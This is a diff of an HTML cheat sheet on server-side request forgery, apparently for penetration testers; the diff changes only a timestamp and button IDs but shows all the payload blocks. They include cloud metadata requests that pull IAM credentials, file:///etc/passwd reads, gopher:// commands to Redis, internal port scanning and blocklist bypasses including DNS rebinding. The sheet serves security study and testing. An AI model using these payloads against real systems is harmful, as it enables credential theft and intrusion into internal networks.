@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:13 -->
+<!-- 2026-07-30 Thu 22:23 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Server-Side Request Forgery</title>
@@ -934,11 +934,11 @@ to the server.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_a2e4271f5ad94edd84e3c292ba43a74e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_1a84a2d804024700a4b3d11d5dba0776>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a2e4271f5ad94edd84e3c292ba43a74e=document.querySelector('button[name=btn_a2e4271f5ad94edd84e3c292ba43a74e]');
-copyBtnbtn_a2e4271f5ad94edd84e3c292ba43a74e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Common parameter names\nurl=, path=, src=, dest=, redirect=, uri=, image=,\nfetch=, load=, resource=, endpoint=, webhook=, callback=\n\n# Common features that trigger SSRF\n- Image/file import from URL\n- PDF generation from URL\n- Webhook configuration\n- URL preview / link unfurling\n- Remote resource fetching (RSS, API proxying)\n- XML processing (XXE can chain to SSRF)\n`);copyBtnbtn_a2e4271f5ad94edd84e3c292ba43a74e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a2e4271f5ad94edd84e3c292ba43a74e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1a84a2d804024700a4b3d11d5dba0776=document.querySelector('button[name=btn_1a84a2d804024700a4b3d11d5dba0776]');
+copyBtnbtn_1a84a2d804024700a4b3d11d5dba0776.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Common parameter names\nurl=, path=, src=, dest=, redirect=, uri=, image=,\nfetch=, load=, resource=, endpoint=, webhook=, callback=\n\n# Common features that trigger SSRF\n- Image/file import from URL\n- PDF generation from URL\n- Webhook configuration\n- URL preview / link unfurling\n- Remote resource fetching (RSS, API proxying)\n- XML processing (XXE can chain to SSRF)\n`);copyBtnbtn_1a84a2d804024700a4b3d11d5dba0776.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1a84a2d804024700a4b3d11d5dba0776.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -965,11 +965,11 @@ fetch=, load=, resource=, endpoint=, webhook=, callback=
 <h3 id="orgb621795">Internal Service Access</h3>
 <div class="outline-text-3" id="text-orgb621795">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d790672e8c7f4f6b95d01b2a189c334b>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b5b0d17465734a02b9553a208007f1e2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d790672e8c7f4f6b95d01b2a189c334b=document.querySelector('button[name=btn_d790672e8c7f4f6b95d01b2a189c334b]');
-copyBtnbtn_d790672e8c7f4f6b95d01b2a189c334b.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Test for basic SSRF — replace URL with localhost\nGET /fetch?url=http://localhost/\nGET /fetch?url=http://127.0.0.1/\nGET /fetch?url=http://0.0.0.0/\n\n# Access internal admin panels\nGET /fetch?url=http://localhost:8080/admin\nGET /fetch?url=http://127.0.0.1:8080/admin\nGET /fetch?url=http://192.168.1.1/admin\n\n# Internal service discovery\nGET /fetch?url=http://127.0.0.1:6379/    # Redis\nGET /fetch?url=http://127.0.0.1:9200/    # Elasticsearch\nGET /fetch?url=http://127.0.0.1:27017/   # MongoDB\nGET /fetch?url=http://127.0.0.1:5601/    # Kibana\n`);copyBtnbtn_d790672e8c7f4f6b95d01b2a189c334b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d790672e8c7f4f6b95d01b2a189c334b.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b5b0d17465734a02b9553a208007f1e2=document.querySelector('button[name=btn_b5b0d17465734a02b9553a208007f1e2]');
+copyBtnbtn_b5b0d17465734a02b9553a208007f1e2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Test for basic SSRF — replace URL with localhost\nGET /fetch?url=http://localhost/\nGET /fetch?url=http://127.0.0.1/\nGET /fetch?url=http://0.0.0.0/\n\n# Access internal admin panels\nGET /fetch?url=http://localhost:8080/admin\nGET /fetch?url=http://127.0.0.1:8080/admin\nGET /fetch?url=http://192.168.1.1/admin\n\n# Internal service discovery\nGET /fetch?url=http://127.0.0.1:6379/    # Redis\nGET /fetch?url=http://127.0.0.1:9200/    # Elasticsearch\nGET /fetch?url=http://127.0.0.1:27017/   # MongoDB\nGET /fetch?url=http://127.0.0.1:5601/    # Kibana\n`);copyBtnbtn_b5b0d17465734a02b9553a208007f1e2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b5b0d17465734a02b9553a208007f1e2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1001,11 +1001,11 @@ movement to cloud infrastructure.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_be67b18d0d244d0e9b6ea332c8c2373d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0c28f08b243649928b2a52e8208b3666>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_be67b18d0d244d0e9b6ea332c8c2373d=document.querySelector('button[name=btn_be67b18d0d244d0e9b6ea332c8c2373d]');
-copyBtnbtn_be67b18d0d244d0e9b6ea332c8c2373d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# AWS — IMDSv1 (no token required)\nGET /fetch?url=http://169.254.169.254/latest/meta-data/\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n# Returns: AccessKeyId, SecretAccessKey, Token\n\n# AWS — alternative addresses\nGET /fetch?url=http://[fd00:ec2::254]/latest/meta-data/   # IPv6\nGET /fetch?url=http://169.254.169.254/latest/user-data     # userdata often contains secrets\n\n# Azure\nGET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Requires: Metadata: true header — may need Burp to inject\n\n# GCP\nGET /fetch?url=http://metadata.google.internal/computeMetadata/v1/\nGET /fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n# Requires: Metadata-Flavor: Google header\n`);copyBtnbtn_be67b18d0d244d0e9b6ea332c8c2373d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_be67b18d0d244d0e9b6ea332c8c2373d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0c28f08b243649928b2a52e8208b3666=document.querySelector('button[name=btn_0c28f08b243649928b2a52e8208b3666]');
+copyBtnbtn_0c28f08b243649928b2a52e8208b3666.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# AWS — IMDSv1 (no token required)\nGET /fetch?url=http://169.254.169.254/latest/meta-data/\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n# Returns: AccessKeyId, SecretAccessKey, Token\n\n# AWS — alternative addresses\nGET /fetch?url=http://[fd00:ec2::254]/latest/meta-data/   # IPv6\nGET /fetch?url=http://169.254.169.254/latest/user-data     # userdata often contains secrets\n\n# Azure\nGET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Requires: Metadata: true header — may need Burp to inject\n\n# GCP\nGET /fetch?url=http://metadata.google.internal/computeMetadata/v1/\nGET /fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n# Requires: Metadata-Flavor: Google header\n`);copyBtnbtn_0c28f08b243649928b2a52e8208b3666.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0c28f08b243649928b2a52e8208b3666.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1040,11 +1040,11 @@ open/closed from response time or error message differences.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e22533bd29c44218bd683e7d405d93c2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_89a93d2bc1c745b08e408c22e31cd6d4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e22533bd29c44218bd683e7d405d93c2=document.querySelector('button[name=btn_e22533bd29c44218bd683e7d405d93c2]');
-copyBtnbtn_e22533bd29c44218bd683e7d405d93c2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Systematically probe ports — observe response differences\nGET /fetch?url=http://192.168.1.10:22    # SSH — connection refused vs timeout\nGET /fetch?url=http://192.168.1.10:80    # HTTP\nGET /fetch?url=http://192.168.1.10:443   # HTTPS\nGET /fetch?url=http://192.168.1.10:3306  # MySQL\nGET /fetch?url=http://192.168.1.10:5432  # PostgreSQL\n\n# Automate with Burp Intruder — payload list of ports\n# Cluster bomb: IP addresses × ports\n# Observe: response size, time, error message to distinguish open/closed\n`);copyBtnbtn_e22533bd29c44218bd683e7d405d93c2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e22533bd29c44218bd683e7d405d93c2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_89a93d2bc1c745b08e408c22e31cd6d4=document.querySelector('button[name=btn_89a93d2bc1c745b08e408c22e31cd6d4]');
+copyBtnbtn_89a93d2bc1c745b08e408c22e31cd6d4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Systematically probe ports — observe response differences\nGET /fetch?url=http://192.168.1.10:22    # SSH — connection refused vs timeout\nGET /fetch?url=http://192.168.1.10:80    # HTTP\nGET /fetch?url=http://192.168.1.10:443   # HTTPS\nGET /fetch?url=http://192.168.1.10:3306  # MySQL\nGET /fetch?url=http://192.168.1.10:5432  # PostgreSQL\n\n# Automate with Burp Intruder — payload list of ports\n# Cluster bomb: IP addresses × ports\n# Observe: response size, time, error message to distinguish open/closed\n`);copyBtnbtn_89a93d2bc1c745b08e408c22e31cd6d4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_89a93d2bc1c745b08e408c22e31cd6d4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1066,11 +1066,11 @@ let res = copyTextToClipboard(`# Systematically probe ports — observe response
 <h3 id="orgfb98f9d">Alternative URL Schemes</h3>
 <div class="outline-text-3" id="text-orgfb98f9d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f792603e623c46b4947983458214b05c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f292d196d9a44b5e9a0a1a0e6381e4bb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f792603e623c46b4947983458214b05c=document.querySelector('button[name=btn_f792603e623c46b4947983458214b05c]');
-copyBtnbtn_f792603e623c46b4947983458214b05c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# File read (if file:// not blocked)\nGET /fetch?url=file:///etc/passwd\nGET /fetch?url=file:///C:/Windows/win.ini\n\n# Gopher — send arbitrary TCP to non-HTTP services\n# Redis command via Gopher\nGET /fetch?url=gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A\n\n# Dict protocol — finger internal services\nGET /fetch?url=dict://127.0.0.1:6379/info\n`);copyBtnbtn_f792603e623c46b4947983458214b05c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f792603e623c46b4947983458214b05c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f292d196d9a44b5e9a0a1a0e6381e4bb=document.querySelector('button[name=btn_f292d196d9a44b5e9a0a1a0e6381e4bb]');
+copyBtnbtn_f292d196d9a44b5e9a0a1a0e6381e4bb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# File read (if file:// not blocked)\nGET /fetch?url=file:///etc/passwd\nGET /fetch?url=file:///C:/Windows/win.ini\n\n# Gopher — send arbitrary TCP to non-HTTP services\n# Redis command via Gopher\nGET /fetch?url=gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A\n\n# Dict protocol — finger internal services\nGET /fetch?url=dict://127.0.0.1:6379/info\n`);copyBtnbtn_f292d196d9a44b5e9a0a1a0e6381e4bb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f292d196d9a44b5e9a0a1a0e6381e4bb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1097,11 +1097,11 @@ Applications often implement blocklists. Bypass attempts:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_38f25942ebd84210840ad0fbc8d81c3c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4f64ab46f8aa43b6bb49f547670c16bf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_38f25942ebd84210840ad0fbc8d81c3c=document.querySelector('button[name=btn_38f25942ebd84210840ad0fbc8d81c3c]');
-copyBtnbtn_38f25942ebd84210840ad0fbc8d81c3c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Alternative representations of 127.0.0.1\nhttp://2130706433/           # decimal\nhttp://0x7f000001/           # hex\nhttp://0177.0.0.1/           # octal\nhttp://127.1/                # short form\nhttp://[::1]/                # IPv6 loopback\nhttp://[::]/ \n\n# DNS rebinding — point your domain to 127.0.0.1\nhttp://attacker.com/         # resolves to 127.0.0.1\n\n# URL encoding\nhttp://%31%32%37%2e%30%2e%30%2e%31/   # 127.0.0.1 encoded\n\n# Open redirect chaining\n# If app allows fetching from trusted domain that redirects:\nGET /fetch?url=https://trusted.com/redirect?to=http://169.254.169.254/\n\n# HTTPS bypass\nhttps://127.0.0.1/           # if only http:// is blocked\n\n# @ symbol trick\nhttp://expected.com@127.0.0.1/    # browser resolves to 127.0.0.1\n\n# Fragment trick\nhttp://127.0.0.1#expected.com\n`);copyBtnbtn_38f25942ebd84210840ad0fbc8d81c3c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_38f25942ebd84210840ad0fbc8d81c3c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4f64ab46f8aa43b6bb49f547670c16bf=document.querySelector('button[name=btn_4f64ab46f8aa43b6bb49f547670c16bf]');
+copyBtnbtn_4f64ab46f8aa43b6bb49f547670c16bf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Alternative representations of 127.0.0.1\nhttp://2130706433/           # decimal\nhttp://0x7f000001/           # hex\nhttp://0177.0.0.1/           # octal\nhttp://127.1/                # short form\nhttp://[::1]/                # IPv6 loopback\nhttp://[::]/ \n\n# DNS rebinding — point your domain to 127.0.0.1\nhttp://attacker.com/         # resolves to 127.0.0.1\n\n# URL encoding\nhttp://%31%32%37%2e%30%2e%30%2e%31/   # 127.0.0.1 encoded\n\n# Open redirect chaining\n# If app allows fetching from trusted domain that redirects:\nGET /fetch?url=https://trusted.com/redirect?to=http://169.254.169.254/\n\n# HTTPS bypass\nhttps://127.0.0.1/           # if only http:// is blocked\n\n# @ symbol trick\nhttp://expected.com@127.0.0.1/    # browser resolves to 127.0.0.1\n\n# Fragment trick\nhttp://127.0.0.1#expected.com\n`);copyBtnbtn_4f64ab46f8aa43b6bb49f547670c16bf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4f64ab46f8aa43b6bb49f547670c16bf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1160,11 +1160,11 @@ target was internal by design.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_220fbac5eba1413585270ce68d21d1a2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_0fe09a91a20c44b887277a60d0536df6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_220fbac5eba1413585270ce68d21d1a2=document.querySelector('button[name=btn_220fbac5eba1413585270ce68d21d1a2]');
-copyBtnbtn_220fbac5eba1413585270ce68d21d1a2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Identify routes gated by source-IP checks (request.remote_addr,\n   X-Forwarded-For trust, or equivalent) rather than session/token\n   auth — these are candidates regardless of whether SSRF is\n   confirmed yet\n2. Identify any SSRF-capable parameter, even one restricted to an\n   allow-list of \"internal\" or \"approved\" hostnames\n3. Check what the allowed hostname(s) actually resolve to — an\n   allow-list entry that resolves to 127.0.0.1/internal range turns\n   the allow-list into free passage to the IP-gated routes\n4. Chain: request the SSRF-capable endpoint targeting the\n   allow-listed hostname, with a path pointing at the IP-gated\n   admin/internal route\n`);copyBtnbtn_220fbac5eba1413585270ce68d21d1a2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_220fbac5eba1413585270ce68d21d1a2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0fe09a91a20c44b887277a60d0536df6=document.querySelector('button[name=btn_0fe09a91a20c44b887277a60d0536df6]');
+copyBtnbtn_0fe09a91a20c44b887277a60d0536df6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Identify routes gated by source-IP checks (request.remote_addr,\n   X-Forwarded-For trust, or equivalent) rather than session/token\n   auth — these are candidates regardless of whether SSRF is\n   confirmed yet\n2. Identify any SSRF-capable parameter, even one restricted to an\n   allow-list of \"internal\" or \"approved\" hostnames\n3. Check what the allowed hostname(s) actually resolve to — an\n   allow-list entry that resolves to 127.0.0.1/internal range turns\n   the allow-list into free passage to the IP-gated routes\n4. Chain: request the SSRF-capable endpoint targeting the\n   allow-listed hostname, with a path pointing at the IP-gated\n   admin/internal route\n`);copyBtnbtn_0fe09a91a20c44b887277a60d0536df6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0fe09a91a20c44b887277a60d0536df6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1205,11 +1205,11 @@ gated content (credentials) in the preview response.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_ea1b8982a19e4843aaf436aea54182bb>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_ff5d7a20ae6045809e2c57bd4ab904ed>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ea1b8982a19e4843aaf436aea54182bb=document.querySelector('button[name=btn_ea1b8982a19e4843aaf436aea54182bb]');
-copyBtnbtn_ea1b8982a19e4843aaf436aea54182bb.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`http://target/preview?url=http://<allowlisted-host>/admin/notes\n`);copyBtnbtn_ea1b8982a19e4843aaf436aea54182bb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ea1b8982a19e4843aaf436aea54182bb.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ff5d7a20ae6045809e2c57bd4ab904ed=document.querySelector('button[name=btn_ff5d7a20ae6045809e2c57bd4ab904ed]');
+copyBtnbtn_ff5d7a20ae6045809e2c57bd4ab904ed.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`http://target/preview?url=http://<allowlisted-host>/admin/notes\n`);copyBtnbtn_ff5d7a20ae6045809e2c57bd4ab904ed.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ff5d7a20ae6045809e2c57bd4ab904ed.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1232,11 +1232,11 @@ Use out-of-band detection.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4358d85c7a484a4d9b9f731b3e1692a7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_331c3865341f45fcb2f7dc0c316adcdb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4358d85c7a484a4d9b9f731b3e1692a7=document.querySelector('button[name=btn_4358d85c7a484a4d9b9f731b3e1692a7]');
-copyBtnbtn_4358d85c7a484a4d9b9f731b3e1692a7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Burp Collaborator — generate a payload URL\n# Insert into SSRF parameter — if Collaborator receives a request,\n# the parameter is being fetched server-side\n\n# Interactsh (open source Collaborator alternative)\n# https://github.com/projectdiscovery/interactsh\ninteractsh-client                    # generates *.oast.fun domain\nGET /fetch?url=http://<id>.oast.fun  # if DNS/HTTP hit received = SSRF confirmed\n\n# Time-based detection\n# Open port → faster response\n# Closed port → connection refused immediately\n# Filtered/no route → timeout (much slower)\n# Measure response times to infer internal network state\n`);copyBtnbtn_4358d85c7a484a4d9b9f731b3e1692a7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4358d85c7a484a4d9b9f731b3e1692a7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_331c3865341f45fcb2f7dc0c316adcdb=document.querySelector('button[name=btn_331c3865341f45fcb2f7dc0c316adcdb]');
+copyBtnbtn_331c3865341f45fcb2f7dc0c316adcdb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Burp Collaborator — generate a payload URL\n# Insert into SSRF parameter — if Collaborator receives a request,\n# the parameter is being fetched server-side\n\n# Interactsh (open source Collaborator alternative)\n# https://github.com/projectdiscovery/interactsh\ninteractsh-client                    # generates *.oast.fun domain\nGET /fetch?url=http://<id>.oast.fun  # if DNS/HTTP hit received = SSRF confirmed\n\n# Time-based detection\n# Open port → faster response\n# Closed port → connection refused immediately\n# Filtered/no route → timeout (much slower)\n# Measure response times to infer internal network state\n`);copyBtnbtn_331c3865341f45fcb2f7dc0c316adcdb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_331c3865341f45fcb2f7dc0c316adcdb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1262,11 +1262,11 @@ let res = copyTextToClipboard(`# Burp Collaborator — generate a payload URL\n#
 <h2 id="org2d5da9f">6. Testing Methodology</h2>
 <div class="outline-text-2" id="text-org2d5da9f">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_b2b1b525a2704ec5b5c4e8965c7e2616>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_68062eeb0e754ed5bfde7a92a390cbbe>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b2b1b525a2704ec5b5c4e8965c7e2616=document.querySelector('button[name=btn_b2b1b525a2704ec5b5c4e8965c7e2616]');
-copyBtnbtn_b2b1b525a2704ec5b5c4e8965c7e2616.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Map all parameters that accept URLs, hostnames, or IPs\n2. Test with http://127.0.0.1 — confirm basic SSRF\n3. Test cloud metadata endpoint (169.254.169.254)\n4. Probe common internal ports on 127.0.0.1 and RFC1918 ranges\n5. Attempt alternative URL schemes: file://, gopher://, dict://\n6. If blocked: work through bypass list in section 3\n7. If no response returned: use Burp Collaborator / Interactsh\n8. Check whether any allow-listed/approved hostname resolves to\n loopback or an internal range — if so, treat it as a direct\n path to any IP-gated internal route, not just a narrower SSRF\n9. Document the request, response, and impact for the report\n`);copyBtnbtn_b2b1b525a2704ec5b5c4e8965c7e2616.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b2b1b525a2704ec5b5c4e8965c7e2616.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_68062eeb0e754ed5bfde7a92a390cbbe=document.querySelector('button[name=btn_68062eeb0e754ed5bfde7a92a390cbbe]');
+copyBtnbtn_68062eeb0e754ed5bfde7a92a390cbbe.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Map all parameters that accept URLs, hostnames, or IPs\n2. Test with http://127.0.0.1 — confirm basic SSRF\n3. Test cloud metadata endpoint (169.254.169.254)\n4. Probe common internal ports on 127.0.0.1 and RFC1918 ranges\n5. Attempt alternative URL schemes: file://, gopher://, dict://\n6. If blocked: work through bypass list in section 3\n7. If no response returned: use Burp Collaborator / Interactsh\n8. Check whether any allow-listed/approved hostname resolves to\n loopback or an internal range — if so, treat it as a direct\n path to any IP-gated internal route, not just a narrower SSRF\n9. Document the request, response, and impact for the report\n`);copyBtnbtn_68062eeb0e754ed5bfde7a92a390cbbe.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_68062eeb0e754ed5bfde7a92a390cbbe.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1308,7 +1308,7 @@ services or cloud metadata endpoints not accessible externally.
 <p>
 <b>Evidence:</b>
 </p>
-<pre class="example" id="org54b15c3">
+<pre class="example" id="org0bc642a">
 GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role HTTP/1.1
 Host: target.com
 
